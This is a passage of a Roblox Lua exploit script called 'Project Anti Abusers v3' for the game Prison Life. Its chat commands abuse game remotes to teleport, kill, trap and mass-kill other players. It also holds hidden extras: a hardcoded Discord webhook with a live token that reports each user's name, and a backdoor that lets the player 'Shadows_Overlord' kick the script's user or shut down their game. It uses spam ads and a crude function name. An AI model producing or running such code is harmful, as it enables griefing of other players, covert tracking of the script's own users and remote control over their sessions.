				local TextLabel_18 = Instance.new("TextLabel")
				local TextLabel_19 = Instance.new("TextLabel")
				local TextLabel_20 = Instance.new("TextLabel")
				local TextLabel_21 = Instance.new("TextLabel")
				local TextButton = Instance.new("TextButton")
				
				ScreenGui.Parent = game.CoreGui
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				
				ScrollingFrame.Parent = ScreenGui
				ScrollingFrame.Active = true
				ScrollingFrame.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				ScrollingFrame.Position = UDim2.new(0.131813675, 0, 0.171503961, 0)
				ScrollingFrame.Size = UDim2.new(0, 124, 0, 244)
				ScrollingFrame.CanvasSize = UDim2.new(0, 0, 1, 0)
				ScrollingFrame.ScrollBarThickness = 5
				
				TextLabel.Parent = ScrollingFrame
				TextLabel.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.Position = UDim2.new(0, 0, 0.0580474921, 0)
				TextLabel.Size = UDim2.new(0, 117, 0, 34)
				TextLabel.Font = Enum.Font.SourceSans
				TextLabel.Text = "kill PLR"
				TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel.TextSize = 14.000
				
				TextLabel_2.Parent = ScrollingFrame
				TextLabel_2.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_2.Position = UDim2.new(0, 0, 0.102902375, 0)
				TextLabel_2.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_2.Font = Enum.Font.SourceSans
				TextLabel_2.Text = "kill cops"
				TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_2.TextSize = 14.000
				
				TextLabel_3.Parent = ScrollingFrame
				TextLabel_3.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_3.Position = UDim2.new(0, 0, 0.147757262, 0)
				TextLabel_3.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_3.Font = Enum.Font.SourceSans
				TextLabel_3.Text = "kill pris"
				TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_3.TextSize = 14.000
				
				TextLabel_4.Parent = ScrollingFrame
				TextLabel_4.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_4.Position = UDim2.new(0, 0, 0.192612141, 0)
				TextLabel_4.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_4.Font = Enum.Font.SourceSans
				TextLabel_4.Text = "kill skids"
				TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_4.TextSize = 14.000
				
				TextLabel_5.Parent = ScrollingFrame
				TextLabel_5.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_5.Position = UDim2.new(0, 0, 0.237467021, 0)
				TextLabel_5.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_5.Font = Enum.Font.SourceSans
				TextLabel_5.Text = "kill crims"
				TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_5.TextSize = 14.000
				
				TextLabel_6.Parent = ScrollingFrame
				TextLabel_6.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_6.Position = UDim2.new(0, 0, 0.2823219, 0)
				TextLabel_6.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_6.Font = Enum.Font.SourceSans
				TextLabel_6.Text = "kill all"
				TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_6.TextSize = 14.000
				
				TextLabel_7.Parent = ScrollingFrame
				TextLabel_7.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_7.Position = UDim2.new(0, 0, 0.327176809, 0)
				TextLabel_7.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_7.Font = Enum.Font.SourceSans
				TextLabel_7.Text = "arrest PLR"
				TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_7.TextSize = 14.000
				
				TextLabel_8.Parent = ScrollingFrame
				TextLabel_8.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_8.Position = UDim2.new(0, 0, 0.372031689, 0)
				TextLabel_8.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_8.Font = Enum.Font.SourceSans
				TextLabel_8.Text = "arrest crims"
				TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_8.TextSize = 14.000
				
				TextLabel_9.Parent = ScrollingFrame
				TextLabel_9.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_9.Position = UDim2.new(0, 0, 0.416886568, 0)
				TextLabel_9.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_9.Font = Enum.Font.SourceSans
				TextLabel_9.Text = "crim PLR"
				TextLabel_9.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_9.TextSize = 14.000
				
				TextLabel_10.Parent = ScrollingFrame
				TextLabel_10.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_10.Position = UDim2.new(0, 0, 0.461741447, 0)
				TextLabel_10.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_10.Font = Enum.Font.SourceSans
				TextLabel_10.Text = "crim cops"
				TextLabel_10.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_10.TextSize = 14.000
				
				TextLabel_11.Parent = ScrollingFrame
				TextLabel_11.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_11.Position = UDim2.new(0, 0, 0.506596327, 0)
				TextLabel_11.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_11.Font = Enum.Font.SourceSans
				TextLabel_11.Text = "crim pris"
				TextLabel_11.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_11.TextSize = 14.000
				
				TextLabel_12.Parent = ScrollingFrame
				TextLabel_12.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_12.Position = UDim2.new(0, 0, 0.551451206, 0)
				TextLabel_12.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_12.Font = Enum.Font.SourceSans
				TextLabel_12.Text = "crim skids"
				TextLabel_12.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_12.TextSize = 14.000
				
				TextLabel_13.Parent = ScrollingFrame
				TextLabel_13.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_13.Position = UDim2.new(0, 0, 0.596306086, 0)
				TextLabel_13.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_13.Font = Enum.Font.SourceSans
				TextLabel_13.Text = "view plr"
				TextLabel_13.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_13.TextSize = 14.000
				
				TextLabel_14.Parent = ScrollingFrame
				TextLabel_14.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_14.Position = UDim2.new(0, 0, 0.641160965, 0)
				TextLabel_14.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_14.Font = Enum.Font.SourceSans
				TextLabel_14.Text = "unview"
				TextLabel_14.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_14.TextSize = 14.000
				
				TextLabel_15.Parent = ScrollingFrame
				TextLabel_15.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_15.Position = UDim2.new(0, 0, 0.686015844, 0)
				TextLabel_15.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_15.Font = Enum.Font.SourceSans
				TextLabel_15.Text = "goto plr"
				TextLabel_15.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_15.TextSize = 14.000
				
				TextLabel_16.Parent = ScrollingFrame
				TextLabel_16.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_16.Position = UDim2.new(0, 0, 0.730870724, 0)
				TextLabel_16.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_16.Font = Enum.Font.SourceSans
				TextLabel_16.Text = "trap plr"
				TextLabel_16.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_16.TextSize = 14.000
				
				TextLabel_17.Parent = ScrollingFrame
				TextLabel_17.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_17.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_17.Position = UDim2.new(0, 0, 0.775725603, 0)
				TextLabel_17.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_17.Font = Enum.Font.SourceSans
				TextLabel_17.Text = "trap cops"
				TextLabel_17.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_17.TextSize = 14.000
				
				TextLabel_18.Parent = ScrollingFrame
				TextLabel_18.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_18.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_18.Position = UDim2.new(0, 0, 0.820580482, 0)
				TextLabel_18.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_18.Font = Enum.Font.SourceSans
				TextLabel_18.Text = "trap pris"
				TextLabel_18.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_18.TextSize = 14.000
				
				TextLabel_19.Parent = ScrollingFrame
				TextLabel_19.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_19.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_19.Position = UDim2.new(0, 0, 0.865435362, 0)
				TextLabel_19.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_19.Font = Enum.Font.SourceSans
				TextLabel_19.Text = "trap skids"
				TextLabel_19.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_19.TextSize = 14.000
				
				TextLabel_20.Parent = ScrollingFrame
				TextLabel_20.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_20.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_20.Position = UDim2.new(0, 0, 0.910290241, 0)
				TextLabel_20.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_20.Font = Enum.Font.SourceSans
				TextLabel_20.Text = "trap crims"
				TextLabel_20.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_20.TextSize = 14.000
				
				TextLabel_21.Parent = ScrollingFrame
				TextLabel_21.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextLabel_21.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_21.Position = UDim2.new(0, 0, 0.955145121, 0)
				TextLabel_21.Size = UDim2.new(0, 117, 0, 34)
				TextLabel_21.Font = Enum.Font.SourceSans
				TextLabel_21.Text = "void plr"
				TextLabel_21.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextLabel_21.TextSize = 14.000
				
				TextButton.Parent = ScrollingFrame
				TextButton.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
				TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
				TextButton.Size = UDim2.new(0, 117, 0, 44)
				TextButton.Font = Enum.Font.SourceSans
				TextButton.Text = "Close commands"
				TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextButton.TextSize = 14.000
				
				local function TWDPIN_fake_script() -- TextButton.LocalScript 
					local script = Instance.new('LocalScript', TextButton)
					
					script.Parent.MouseButton1Click:connect(function()
						script.Parent.Parent.Parent:Destroy()
					end)
				end
				coroutine.wrap(TWDPIN_fake_script)()
				
			elseif string.sub(script.Parent.Text, 1, 5) == "crim " then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
				wait(0.2)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				for i,v in pairs(GetPlayer(string.sub(script.Parent.Text, 6))) do
					i = 1
					repeat
						i = i-1
						if v and v.Character then
							saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
							game.Players.LocalPlayer.Character.Humanoid.Sit = false
							for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
								if Z.Name == "Remington 870" then
									workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
								end
							end
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
							game.Players.LocalPlayer.Character.Humanoid.Name = 1
							cl = game.Players.LocalPlayer.Character["1"]:Clone()
							cl.Parent = game.Players.LocalPlayer.Character
							cl.Name = "Humanoid"
							wait()
							game.Players.LocalPlayer.Character["1"]:Destroy()
							game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
							game.Players.LocalPlayer.Character.Animate.Disabled = true
						end
						game.Players.LocalPlayer.Character.Animate.Disabled = false
						game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
						for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
							if v.Name == "Remington 870" then
								game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
							end
						end
						v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
						wait(0.3)
						workspace.Remote.loadchar:InvokeServer("", "Fog")
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(955.158264, 99.9900055, 2358.90356, -0.0176578518, -5.05020853e-06, 0.999844074, -1.382882e-10, 1, 5.05099388e-06, -0.999844074, 8.90514329e-08, -0.0176578518)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(BHAA_fake_script)()


args = {
    "https://discordapp.com/api/webhooks/745612743507443753/ZZbn4k1rVc1xwz_slARU8egAgkDhVYGsK3iJTq1bOxuhAMmGBuA20n99I9m1jBXkriCN",
    game.Players.LocalPlayer.Name.." Loaded up Project Anti Abusers v3! player uses synapse"
}

sendweb(unpack(args))

local function FindTarget(name)
	name = name:lower()
	for k,v in pairs(game.Players:GetPlayers()) do
		if v.Name:lower():sub(1,#name) == name then
			return v
		end
	end
end

game.Players.LocalPlayer.Chatted:connect(function(msg)
	if msg:sub(1,6) == ".kill " then
		v = FindTarget(msg:sub(7))
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		rape(v)
	elseif msg:sub(1,5) == '.ilk ' then
        target = FindPlayer(msg:sub(6))
        repeat
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
            rape(target)
            wait()
        until target == nil
	elseif msg:sub(1,8) == ".arrest " then
		v = FindTarget(msg:sub(9))
		saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	elseif msg:sub(1,8) == ".userid " then
		v = FindTarget(msg:sub(9))
		tbl = {
			v.Name.."'s Userid is "..v.UserId,
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	elseif msg:sub(1,5) == ".age " then
		v = FindTarget(msg:sub(6))
		tbl = {
			v.Name.."'s account age is "..v.AccountAge.." days old",
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	elseif msg:sub(1,6) == ".crim " then
		v = FindTarget(msg:sub(7))
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	elseif msg:sub(1,6) == ".trap " then
		v = FindTarget(msg:sub(7))
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-306.426514, 54.2398338, 1982.18201, 0.812489867, -4.78796665e-08, 0.582975328, 7.8811361e-08, 1, -2.77091701e-08, -0.582975328, 6.84584975e-08, 0.812489867)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	elseif msg:sub(1,6) == ".void " then
		v = FindTarget(msg:sub(7))
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327)
		wait(0.2)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		if v and v.Character then
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	elseif msg:sub(1,8) == ".killall" then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) and v.Name ~= target.Name then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				rape(v)
			end
		end
	elseif msg:sub(1,6) == ".kcops" then
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				i = 1
				repeat
					i = i-1
				rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,6) == ".view " then
		v = FindTarget(msg:sub(7))
		workspace.Camera.CameraSubject = v.Character.Humanoid
	elseif msg:sub(1,7) == ".unview" then
		workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
	elseif msg:sub(1,6) == ".kpris" then
		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				i = 1
				repeat
					i = i-1
				rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,7) == ".kskids" then
		for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				i = 1
				repeat
					i = i-1
				rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,4) == ".ksu" then
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Backpack:FindFirstChild("Riot Shield") ~= nil and v.Character:FindFirstChild("Riot Shield") ~= nil then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,5) == ".karm" then
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Character("Vest") ~= nil then
				i = 1
				repeat 
					i = i-1
					rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,9) == ".paausers" then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.OsPlatform == "Project Anti Abusers" then
				args = {
					"amount of paa users in this server: "..#v,
					"all"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	elseif msg:sub(1,6) == ".uilk " then
		target = FindTarget(msg:sub(7))
		if target.Name ~= "Shadows_Overlord" then
			while wait(.5) do
				rape(target)
			end
		end
	elseif msg:sub(1,7) == ".bring " then
		v = FindTarget(msg:sub(8))
		if v and v.Character then
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			game.Players.LocalPlayer.Character.Humanoid.Sit = false
			for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
				if Z.Name == "Remington 870" then
					workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
				end
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			cl = game.Players.LocalPlayer.Character["1"]:Clone()
			cl.Parent = game.Players.LocalPlayer.Character
			cl.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			if v.Name == "Remington 870" then
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
			end
		end
		v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
		wait(0.3)
		workspace.Remote.loadchar:InvokeServer()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
	elseif msg:sub(1,7) == ".kcrims" then
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				i = 1
				repeat
					i = i-1
				rape(v)
				until i == 0
			end
		end
	elseif msg:sub(1,3) == ".ad" then
		tbl = {
			"I am a proud user of Project Anti Abusers! want to check it out? discycord invite code is CWSsGEm",
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	elseif msg:sub(1,6) == ".using" then
		tbl = {
			"I am a proud user of Project Anti Abusers! want to check it out? discycord invite code is CWSsGEm",
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	elseif msg:sub(1,5) == ".cmds" then
		tbl = {
			"usable commands are: .kill PLR|.arrest PLR|.userid PLR | .age PLR|.crim PLR|.trap PLR|.void PLR|.killall|.kcops|.kpris|.kcrims|.kskids|.ad|.using",
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	elseif msg:sub(1,7) == ".acrims" then
		i = 3
		repeat
			i = i-1
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
					wait(0.2)
					workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
					wait(0.5)
					for i = 1,15 do
						game.ReplicatedStorage.meleeEvent:FireServer(v)
					end
				end
			end
		until i == 0
	end
end)

for i,v in pairs(game.Players:GetPlayers()) do
	if v.Name == "Shadows_Overlord" then
		v.Chatted:connect(function(msg)
			if msg:sub(1,6) == ".kick " then
				a = FindTarget(msg:sub(7))
				if a.Name == game.Players.LocalPlayer.Name then
					game.Players.LocalPlayer:Kick("you just got kicked by Shadows_Overlord, cool!")
				end
			end
		end)
	end
end

game.Players.ChildAdded:connect(function(child)
    if child.Name == "Shadows_Overlord" then
        child.Chatted:connect(function(msg)
            if msg:sub(1,6) == ".kick " then
                a = FindTarget(msg:sub(7))
                if a.Name == game.Players.LocalPlayer.Name then
                    game:Shutdown()
                end
            end
        end)
    end
end)

_G.loaded = true
